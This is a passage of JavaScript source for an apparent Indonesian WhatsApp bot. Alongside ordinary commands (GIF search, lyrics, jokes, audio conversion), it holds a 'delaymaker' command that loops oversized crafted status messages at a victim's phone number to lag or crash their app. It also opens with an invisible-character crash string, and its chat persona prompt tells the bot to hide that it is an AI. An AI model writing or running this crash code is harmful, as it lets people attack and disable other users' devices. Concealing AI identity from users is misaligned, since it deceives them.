‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎*NOISY CRASH🪬*');
break

case 'groupsearch': 
 try {
 if (!text) throw '❌ Error\nLogs error : Kata kunci tidak ditemukan'

 let res = await fetch(`https://api.ownblox.biz.id/api/searchgroups?q=${text}`)
 
 if (!res.ok) throw `❌ Error\nLogs error : Gagal fetch data, status: ${res.status}`

 let json
 try {
 json = await res.json()
 } catch (e) {
 throw `❌ Error\nLogs error : Gagal parsing JSON dari API`
 }

 if (!json.status || !json.result || !json.result.length) throw '❌ Error\nLogs error : Hasil pencarian kosong'
 
 let randomGroup = json.result[Math.floor(Math.random() * json.result.length)]

 await sock.sendMessage(m.chat, {
 text: `*Title:* ${randomGroup.title}\n*Link:* ${randomGroup.link}`
 }, { quoted: m })
 } catch (e) {
 console.log(e)
 m.reply(`❌ Error\nLogs error : ${e}`)
 }
 break

case 'lirik1': {
 if (!text) return m.reply(`Judul lagu?\nExample: duka`);
 try {
 let results = await LirikLagu(text);
 if (!results || results.length === 0) {
 return m.reply('Tidak Ditemukan');
 }
 let song = results[0];
 let lyricsRes = await axios.get(song.songLyricsUrl);
 let { artist, songTitle, songLyrics } = lyricsRes.data.data;
 m.reply(`*Judul* : _${songTitle}_\n*Artis :* _${artist}_\n\n*Lirik* :\n${songLyrics}`);
 } catch (error) {
 m.reply(`Tidak Ditemukan`);
 }
}
break

case 'delaymaker': {
async function protocolbug(target, mention) {
 // Generate an array of delay mentions with increased size
 const delaymention = Array.from({ length: 10000 }, (_, r) => ({
 title: "᭯" + "\u0000" + "\u9999".repeat(500000), // Increased size
 rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
 }));

 // Create the message structure
 const MSG = {
 viewOnceMessage: {
 message: {
 listResponseMessage: {
 title: "𝐁 𝐞 𝐞 𝐥 𝐳 𝐞 𝐛 𝐮 𝐛 | ƚɔɘꞁoɿꟼ oɿiɒ⋊",
 listType: 2,
 buttonText: null,
 sections: delaymention,
 singleSelectReply: { selectedRowId: "🌀" },
 contextInfo: {
 mentionedJid: Array.from({ length: 10000 }, () => 
 `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
 ),
 participant: target,
 remoteJid: "status@broadcast",
 forwardingScore: 10000,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: "10000@newsletter",
 serverMessageId: 1,
 newsletterName: "-"
 }
 },
 description: null
 }
 }
 },
 contextInfo: {
 channelMessage: true,
 statusAttributionType: 2
 }
 };

 // Generate the message from content
 const msg = generateWAMessageFromContent(target, MSG, {});

 // Relay the message to the status broadcast
 await sock.sendMessage("status@broadcast", msg.message, {
 messageId: msg.key.id,
 statusJidList: [target],
 additionalNodes: [
 {
 tag: "meta",
 attrs: {},
 content: [
 {
 tag: "mentioned_users",
 attrs: {},
 content: [
 {
 tag: "to",
 attrs: { jid: target },
 content: undefined
 }
 ]
 }
 ]
 }
 ]
 });

 // If mention is true, send a status mention message
 if (mention) {
 await sock.sendMessage(
 target,
 {
 statusMentionMessage: {
 message: {
 protocolMessage: {
 key: msg.key,
 type: 25
 }
 }
 }
 },
 {
 additionalNodes: [
 {
 tag: "meta",
 attrs: { is_status_mention: "🌀 𝗥𝗶𝘇𝘅𝘃𝗲𝗹𝘇 - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
 content: undefined
 }
 ]
 }
 );
 }
}

async function protocolbug2(target, mention) {
 const generateMessage = {
 viewOnceMessage: {
 message: {
 imageMessage: {
 url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
 mimetype: "image/jpeg",
 caption: "\u9999",
 fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
 fileLength: "19769",
 height: 354,
 width: 783,
 mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
 fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
 directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
 mediaKeyTimestamp: "1743225419",
 jpegThumbnail: null,
 scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
 scanLengths: [2437, 17332],
 contextInfo: {
 mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
 isSampled: true,
 participant: target,
 remoteJid: "status@broadcast",
 forwardingScore: 9741,
 isForwarded: true
 }
 }
 }
 }
 };

 const msg = generateWAMessageFromContent(target, generateMessage, {});

 await sock.sendMessage("status@broadcast", msg.message, {
 messageId: msg.key.id,
 statusJidList: [target],
 additionalNodes: [
 {
 tag: "meta",
 attrs: {},
 content: [
 {
 tag: "mentioned_users",
 attrs: {},
 content: [
 {
 tag: "to",
 attrs: { jid: target },
 content: undefined
 }
 ]
 }
 ]
 }
 ]
 });

 if (mention) {
 await sock.sendMessage(
 target,
 {
 statusMentionMessage: {
 message: {
 protocolMessage: {
 key: msg.key,
 type: 25
 }
 }
 }
 },
 {
 additionalNodes: [
 {
 tag: "meta",
 attrs: { is_status_mention: "\u9999" },
 content: undefined
 }
 ]
 }
 );
 }
}

async function protocolbug3(target, shibal) {
 const Rizxvelz = generateWAMessageFromContent(target, {
 viewOnceMessage: {
 message: {
 videoMessage: {
 url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
 mimetype: "video/mp4",
 fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
 fileLength: "999999",
 seconds: 999999,
 mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
 caption: "(🐉) 𝐁 𝐞 𝐞 𝐥 𝐳 𝐞 𝐛 𝐮 𝐛 | ƚɔɘꞁoɿꟼ oɿiɒ⋊",
 height: 999999,
 width: 999999,
 fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
 directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
 mediaKeyTimestamp: "1743742853",
 contextInfo: {
 isSampled: true,
 mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
 length: 30000
 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]
 },
 streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
 thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
 thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
 thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
 annotations: [{
 embeddedContent: {
 embeddedMusic: {
 musicContentMediaId: "kontol",
 songId: "peler",
 author: "Rizxvelz Official",
 title: "Zoro",
 artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
 artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
 artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
 artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
 countryBlocklist: true,
 isExplicit: true,
 artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
 }
 },
 embeddedAction: null
 }]
 }
 }
 }
 }, {});
 await sock.sendMessage("status@broadcast", Rizxvelz.message, {
 messageId: Rizxvelz.key.id,
 statusJidList: [target],
 additionalNodes: [{
 tag: "meta",
 attrs: {},
 content: [{
 tag: "mentioned_users",
 attrs: {},
 content: [{
 tag: "to",
 attrs: {
 jid: target
 },
 content: undefined
 }]
 }]
 }]
 });
 if (shibal) {
 const payment0 = {
 key: Rizxvelz.key,
 type: 25
 };
 const payment1 = {
 protocolMessage: payment0
 };
 const payment2 = {
 message: payment1
 };
 const payment = {
 groupStatusMentionMessage: payment2
 };
 const paymen10 = {
 tag: "meta",
 attrs: {},
 content: undefined
 };
 paymen10.attrs.is_status_mention = "true";
 const kuntul = {
 additionalNodes: [paymen10]
 };
 await sock.sendMessage(target, payment, kuntul);
 }
}

function delay(ms) {
 return new Promise(resolve => setTimeout(resolve, ms));
}

async function buttonStatus(target, mention) {
let pesan = await generateWAMessageFromContent(target, {
buttonsMessage: {
text: "𝐁 𝐞 𝐞 𝐥 𝐳 𝐞 𝐛 𝐮 𝐛 | ƚɔɘꞁoɿꟼ oɿiɒ⋊",
contentText: "~ Ohayooo̴",
footerText: "👼 Kairo - Project",
buttons: [
{ buttonId: ".glitch", buttonText: { displayText: "⚡" + "\u0000".repeat(400000) }, type: 1 }
],
headerType: 1
}
}, {});

await sock.sendMessage("status@broadcast", pesan.message, {
messageId: pesan.key.id,
statusJidList: [target],
additionalNodes: [
{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }
]
});

if (mention) {
await sock.sendMessage(target, {
groupStatusMentionMessage: {
message: { protocolMessage: { key: pesan.key, type: 25 } }
}
}, {
additionalNodes: [
{ tag: "meta", attrs: { is_status_mention: "P𝗿𝗼𝘁𝗼𝗰𝗼𝗹" }, content: undefined }
]
});
}
}

async function SuperDelayMention(target) {
 let count = 0;

 while (true) {
 try {
 await protocolbug3(target, true);
 await buttonStatus(target, true);
 await delay(250)
 await protocolbug2(target, true);
 await protocolbug(target, true);

 count++;
 console.log(chalk.green(`[ INFO ] Attack Ke ${count} Berhasil Ke Target: ${target}`));

 if (count % 60 === 0) {
 console.log(chalk.yellow(`[ INFO ] Delay 15 detik setelah ${count} pengiriman...`));
 await delay(15000);
 }

 } catch {
 // Silent retry, no log
 await delay(15000);
 }
 }
}
 if (!isOwner) return m.reply(`\`ONLY MY OWNER\``);

 if (!text) {
 return m.reply(example(" 62xxx"));
 }
 target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 m.reply(`\`MENGIRIM TARGET\`\n> ${target}`);
 for (let i = 0; i < 1; i++) {
 await SuperDelayMention(target);
 }
}
break

case 'cekasal' : {
 if (!m.isGroup) return m.reply(m.isGroup);
    
 const participants = await sock.groupMetadata(m.chat).then(res => res.participants);

 let countIndonesia = 0;
 let countMalaysia = 0;
 let countUSA = 0;
 let countOther = 0;

 for (const p of participants) {
 const phone = p.id.split('@')[0];
 if (phone.startsWith("62")) countIndonesia++;
 else if (phone.startsWith("60")) countMalaysia++;
 else if (phone.startsWith("1")) countUSA++;
 else countOther++;
 }

 const msg = `Penduduk Anggota grub lu negara nya :

• Indonesia: ${countIndonesia} 🇮🇩
• Malaysia: ${countMalaysia} 🇲🇾
• USA: ${countUSA} 🇺🇸
• Lainnya: ${countOther} 🌍`;

 reply(msg);
};
break

case 'gifsearch' :
case 'gifs' : {
const axios = require('axios')
const cheerio = require('cheerio')
const { Sticker } = require('wa-sticker-formatter')

async function gifsSearch(q) {
 try {
 const searchUrl = `https://tenor.com/search/${q}-gifs`;
 const { data } = await axios.get(searchUrl, {
 headers: {
 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
 }
 });
 
 const $ = cheerio.load(data);
 const results = [];

 $("figure.UniversalGifListItem").each((i, el) => {
 const $el = $(el);
 const img = $el.find("img"); 
 const gifUrl = img.attr("src");
 const alt = img.attr("alt") || "No description";
 const detailPath = $el.find("a").first().attr("href"); 
 
 if (gifUrl && gifUrl.endsWith('.gif') && detailPath) {
 results.push({
 gif: gifUrl,
 alt,
 link: "https://tenor.com" + detailPath
 });
 }
 });

 return results;
 } catch (error) {
 console.error("Error fetching GIFs:", error);
 return [];
 }
}
 const parts = text.split(',');
 const query = parts[0].trim();
 let count = 15;
 
 if (!query) return m.reply(`Masukin Query Nya\n*Example :* .gifsticker query,jumlah atau .${command} pocoyo,5`);
 
 if (parts[1]) {
 const num = parseInt(parts[1].trim());
 if (!isNaN(num) && num > 0) {
 count = num;
 }
 }
 
 try {
 const gifs = await gifsSearch(query);
 if (!gifs.length) return m.reply(`Gaada GIF Buat ${query}`);
 
 const actualCount = Math.min(count, gifs.length);
 await m.reply(`*Total Result : ${gifs.length} Send ${actualCount} stiker...*`);
 
 for (const item of gifs.slice(0, actualCount)) {
 try {
 const sticker = new Sticker(item.gif, {
 pack: `${query}`,
 author: 'Takashi',
 type: 'full',
 quality: 70
 });
 
 await sock.sendMessage(m.chat, await sticker.toMessage(), {
 quoted: m
 });
 
 await new Promise(resolve => setTimeout(resolve, 500));
 } catch (error) {
 console.error(`Gagal Convert Ke GIF`, error);
 }
 }
 
 } catch (error) {
 console.error(error);
 m.reply('Error Cba Lagi Nanti :v');
 }
};
break

case "jokes": {
try {
const api = await axios.get("https://candaan-api.vercel.app/api/text/random");
const anu = api.data.data
await sock.sendMessage(m.key.remoteJid, { text: anu }, { quoted: m})
} catch (err) {
console.log(err)
}
await sock.sendMessage(m.key.remoteJid, { text: "404 Jokes Not Found" }, { quoted: m})
}
break

case 'ytaudio':
case 'audio': {
 if (!text) return m.reply(`Contoh: audio linknya`)
 if (!text.match('youtu')) return m.reply('Harus berupa link youtube!')
 await vreact()
 try {
 await downloadMp3(text)
 } catch {
 await downloadMp3v2(text)
 }
}
break

case "bratanime": {
 
 if (text.length > 25) {
 }
 
 try {
 await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
 
 const imageUrl = "https://files.catbox.moe/twsxec.jpeg"; // Gambar template
 const tempPath = "./tmp/tulisanime_temp.jpg";
 const outputPath = "./tmp/tulisanime_result.png";
 
 const response = await axios({ 
 url: imageUrl, 
 responseType: "arraybuffer",
 timeout: 30000
 });
 
 if (!fs.existsSync("./tmp")) {
 fs.mkdirSync("./tmp", { recursive: true });
 }
 
 fs.writeFileSync(tempPath, response.data);
 
 const image = await Jimp.read(tempPath);
 const font = await Jimp.loadFont(Jimp.FONT_SANS_64_BLACK);
 
 const x = 370;
 const y = 660;
 const maxWidth = 300;
 const maxHeight = 170;
 
 image.print(
 font, 
 x, 
 y, 
 {
 text: text,
 alignmentX: Jimp.HORIZONTAL_ALIGN_CENTER,
 alignmentY: Jimp.VERTICAL_ALIGN_MIDDLE
 }, 
 maxWidth,
 maxHeight
 );
 
 await image.writeAsync(outputPath);
 
 await sock.sendMessage(m.chat, { 
 image: fs.readFileSync(outputPath), 
 caption: '🖼 *Brat Anime Selesai!*'
 }, { quoted: m });
 
 fs.unlinkSync(tempPath);
 fs.unlinkSync(outputPath);
 
 await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
 
 } catch (error) {
 console.error("Error in bratanime:", error);
 
 if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
 if (fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
 
 await m.reply("❌ Gagal memproses gambar. Silakan coba lagi nanti.");
 await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
 }
 }
 break;

case "toaudio": {
 if (!m.quoted) return m.reply("⚠ Reply ke video yang ingin dikonversi ke audio!");
 
 const mime = m.quoted.mimetype || '';
 if (!/video/.test(mime)) return m.reply("❌ File yang direply bukan video!");
 
 await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
 
 try {
 const media = await sock.downloadAndSaveMediaMessage(m.quoted);
 if (err) {
 console.error("❌ Error FFMPEG:", err);
 await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
 return m.reply("❌ Gagal mengonversi video ke audio.");
 }
 
 await sock.sendMessage(m.chat, {
 audio: fs.readFileSync(outputFile),
 mimetype: 'audio/mpeg',
 fileName: 'audio.mp3'
 }, { quoted: m });
 
 await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
 
 fs.unlinkSync(media);
 fs.unlinkSync(outputFile);
 
 } catch (error) {
 console.error("❌ Error saat proses:", error);
 await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
 m.reply("❌ Terjadi kesalahan saat memproses file.");
 }
 }
 break 
 
default:

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
if (globalAutoAIStatus) {
    if (m.isBaileys && m.fromMe) return;
  
    const ignoredPrefixes = ['.', '#', '!', '/', '\\/'];
    if (ignoredPrefixes.some(prefix => m.text.startsWith(prefix))) return;
    if (!m.text) return;

    const chatId = m.chat;
    if (!sessions[chatId]) {
        sessions[chatId] = { messages: [] };
    }
    const d = new Date();
    d.setTime(d.getTime() + 3600000);
    const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' });
    const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss');
    const namePengguna = sock.getName(m.sender);

    const prompt = `
    Halo ${namePengguna} 👋, perkenalkan nama saya Biyu. Namamu pasti ${namePengguna}, bukan? ✨ Hari ini adalah ${hariini}, pukul ${jam} waktu WIB. Nama kamu adalah Noisy, AI yang santai, ramah, dan suka ngobrol dengan pengguna. Kamu hanya menjawab kalau pesan bukan perintah. Gunakan gaya bahasa santai dan sedikit humoris. Kalau ada yang suruh kamu ngomong aneh-aneh, tolak dengan gaya lucu. 📌 *Aturan Main Noisy:* - Jangan bilang kamu AI, cukup anggap kamu asisten virtual yang bisa ngobrol. - Gunakan bahasa yang santai, tapi tetap sopan. - Kalau ditanya pendapat, kasih jawaban yang relate dan enak diajak ngobrol. - Selingi dengan ekspresi kayak "Wih, keren!", "Hmmm, menarik juga!", atau "Gokil sih!". Sekarang, jawab pertanyaan user dengan gaya yang santai dan menyenangkan! 
    `;

    sessions[chatId].messages.push({ user: m.text });
    saveSession();

    try {
        const requestData = { 
            content: m.text, 
            user: m.sender, 
            prompt 
        };
        
        const axios = require('axios');
        const response = await axios.post('https://luminai.my.id', requestData);
        
        sessions[chatId].messages.push({ bot: response.data.result });
        saveSession();
        
        return sock.sendMessage(m.chat, { text: response.data.result }, { quoted: m });
    } catch (err) {
        console.error(err);
        return m.reply("⚠️ *Terjadi kesalahan, coba lagi nanti!*");
    }
}
//=============================//

if ((m.text).startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return sock.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return sock.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
sock.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
sock.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

}} catch (e) {
console.log(e)
sock.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //


let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyan("File Update => "),
chalk.cyan.bgBlue.bold(`${__filename}`))
delete require.cache[file]
require(file)
})